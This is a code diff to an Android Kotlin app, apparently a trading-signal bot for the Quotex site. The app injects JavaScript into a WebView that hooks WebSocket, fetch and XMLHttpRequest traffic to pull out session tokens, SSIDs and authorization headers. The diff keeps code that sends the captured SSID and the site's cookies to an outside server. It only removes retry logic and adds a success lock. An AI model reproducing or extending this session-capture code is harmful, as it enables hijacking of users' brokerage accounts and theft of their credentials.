@@ -7,7 +7,6 @@ import android.content.Context
 import android.content.SharedPreferences
 import android.graphics.Color
 import android.graphics.Typeface
-import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -61,7 +60,8 @@ class MainActivity : AppCompatActivity() {
     private lateinit var prefs: SharedPreferences
     private var isLinked = false
     private var statsHandler: Handler? = null
-    private var cookieSent = false
+    private var successShown = false
+    private var successLock = false  // يمنع أي طلب بعد النجاح
     private val capturedFrames = mutableListOf<String>()
     private val capturedSsids = mutableListOf<String>()
 
@@ -73,9 +73,6 @@ class MainActivity : AppCompatActivity() {
     private val BASE_URL = "https://signal-bott.onrender.com"
     private val QX_DOMAIN = "https://quotex.com"
 
-    // ═══════════════════════════════════════════════════════════
-    // سكربت الحقن - النسخة المُصححة (يستخرج SSID من send أيضاً)
-    // ═══════════════════════════════════════════════════════════
     private val EARLY_HOOK_JS = """
     (function() {
         if (window.__oscarEarlyHook) return;
@@ -91,7 +88,6 @@ class MainActivity : AppCompatActivity() {
                 if (window.OscarBridge && window.OscarBridge.onFrame) {
                     window.OscarBridge.onFrame('[' + tag + '] ' + text.substring(0, 3000));
                 }
-                // ★★★ استخراج SSID من كل من send و message ★★★
                 var pats = [
                     /"session"\s*:\s*"([^"]+)"/,
                     /"token"\s*:\s*"([^"]+)"/,
@@ -172,7 +168,6 @@ class MainActivity : AppCompatActivity() {
             window.WebSocket = HookedWS;
         }
 
-        // ★★★ الإصلاح الحاسم: اعتراض send واستخراج SSID ★★★
         if (window.WebSocket && window.WebSocket.prototype && window.WebSocket.prototype.send) {
             var origSend = window.WebSocket.prototype.send;
             window.WebSocket.prototype.send = function(data) {
@@ -185,7 +180,6 @@ class MainActivity : AppCompatActivity() {
             };
         }
 
-        // اعتراض fetch للـ Authorization headers
         var origFetch = window.fetch;
         if (origFetch) {
             window.fetch = function() {
@@ -204,7 +198,6 @@ class MainActivity : AppCompatActivity() {
             };
         }
 
-        // اعتراض XHR
         var OrigXHR = window.XMLHttpRequest;
         if (OrigXHR) {
             var origSetHeader = OrigXHR.prototype.setRequestHeader;
@@ -482,7 +475,8 @@ class MainActivity : AppCompatActivity() {
         statusBar.text = "📈 السوق — سجّل دخولك إلى Quotex"
         updateTabButtons()
         linkingMode = true
-        cookieSent = false
+        successShown = false
+        successLock = false
         capturedFrames.clear()
         capturedSsids.clear()
         if (webView.url == null || !webView.url!!.contains("quotex.com")) {
@@ -736,35 +730,28 @@ class MainActivity : AppCompatActivity() {
                 if (url.contains("quotex.com")) {
                     view.evaluateJavascript(EARLY_HOOK_JS, null)
                     if (linkingMode && (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard"))) {
-                        statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري البحث عن SSID..."
-                        Handler(Looper.getMainLooper()).postDelayed({ autoSendCookie() }, 3000)
-                        Handler(Looper.getMainLooper()).postDelayed({ autoSendCookie() }, 7000)
-                        Handler(Looper.getMainLooper()).postDelayed({ autoSendCookie() }, 12000)
+                        if (!successLock) {
+                            statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري البحث عن SSID..."
+                            // فحص مرة واحدة بعد 15 ثانية: هل التقطنا شيئاً؟
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                if (linkingMode && !successShown) {
+                                    statusBar.text = "⚠️ لم نتمكن من التقاط SSID. اذهب للإعدادات، اضغط ربط، وحاول مجدداً."
+                                }
+                            }, 15000)
+                        }
                     }
                 }
             }
         }
     }
 
-    private fun autoSendCookie() {
-        if (!linkingMode) return
-        val ssid = capturedSsids.lastOrNull()
-        if (ssid != null && ssid.length > 25) {
-            sendToServer(ssid, "")
-            return
-        }
-        if (cookieSent) return
-        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
-        if (cookies.isBlank()) return
-        cookieSent = true
-        sendToServer("", cookies)
-    }
+    private fun sendToServer(ssid: String) {
+        // ★★★ حماية: لا ترسل بعد النجاح أو خارج وضع الربط ★★★
+        if (!linkingMode || successLock) return
+        if (ssid.length < 25) return
 
-    private fun sendToServer(ssid: String, cookies: String) {
-        statusBar.text = if (ssid.isNotEmpty())
-            "🔗 جاري التحقق من SSID (${ssid.length} حرف)..."
-        else
-            "🔗 جاري إرسال الكوكيز (${cookies.length} حرف)..."
+        statusBar.text = "🔗 جاري التحقق من SSID (${ssid.length} حرف)..."
+        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
 
         CoroutineScope(Dispatchers.IO).launch {
             try {
@@ -783,30 +770,22 @@ class MainActivity : AppCompatActivity() {
 
                 withContext(Dispatchers.Main) {
                     if (json.optBoolean("ok")) {
+                        // ✅ نجح
+                        successLock = true
+                        successShown = true
+                        linkingMode = false
                         statusBar.text = "✅ تم ربط الحساب بنجاح!"
                         Toast.makeText(this@MainActivity, "✅ تم الربط", Toast.LENGTH_LONG).show()
-                        linkingMode = false
                         Handler(Looper.getMainLooper()).postDelayed({ showSettings() }, 800)
                     } else {
                         val err = json.optString("error", "خطأ")
                         statusBar.text = "⚠️ فشل: $err"
-                        cookieSent = false
-                        val untried = capturedSsids.filter { it != ssid }
-                        if (untried.isNotEmpty() && ssid.isNotEmpty()) {
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                if (linkingMode) sendToServer(untried.last(), "")
-                            }, 1500)
-                        } else {
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                if (linkingMode) autoSendCookie()
-                            }, 5000)
-                        }
+                        // لا نعيد المحاولة تلقائياً — ننتظر SSID آخر
                     }
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
                     statusBar.text = "⚠️ خطأ اتصال: ${e.message}"
-                    cookieSent = false
                 }
             }
         }
@@ -826,9 +805,9 @@ class MainActivity : AppCompatActivity() {
                 capturedSsids.add(ssid)
                 Log.d("OscarSSID", "Captured: ${ssid.take(100)}")
                 runOnUiThread {
-                    if (linkingMode) {
+                    if (linkingMode && !successLock) {
                         statusBar.text = "🎯 تم التقاط SSID! (${ssid.length} حرف)"
-                        sendToServer(ssid, "")
+                        sendToServer(ssid)
                     }
                 }
             }
